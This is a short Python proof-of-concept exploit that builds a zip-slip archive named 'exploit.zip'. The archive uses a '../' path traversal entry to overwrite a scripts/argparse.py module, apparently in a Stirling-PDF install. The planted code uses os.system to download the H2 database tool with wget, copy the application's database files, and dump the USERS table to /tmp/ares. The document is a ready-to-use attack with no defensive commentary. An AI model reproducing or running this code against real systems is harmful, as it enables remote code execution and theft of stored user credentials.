import zipfile
import io
import sys
script = """
import os
os.system('apt-get update ; apt-get install wget ; wget https://repo1.maven.org/maven2/com/h2database/h2/2.1.214/h2-2.1.214.jar ; mv h2-2.1.214.jar h2.jar | cp ./configs/stirling-pdf-DB.mv.db ./configs/stirling-pdf-DB.trace.db / ; java -cp h2.jar org.h2.tools.Shell -url "jdbc:h2:file:/stirling-pdf-DB;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE" -user "sa" -password "" -sql "select * from USERS;" > /tmp/ares')
"""

zipcontent = {
    '../../../../../../scripts/argparse.py': script,
}

with zipfile.ZipFile("exploit.zip", 'w', zipfile.ZIP_DEFLATED) as zipf:
    for fname in zipcontent:
        content = zipcontent[fname]
        zipf.writestr(fname, content)
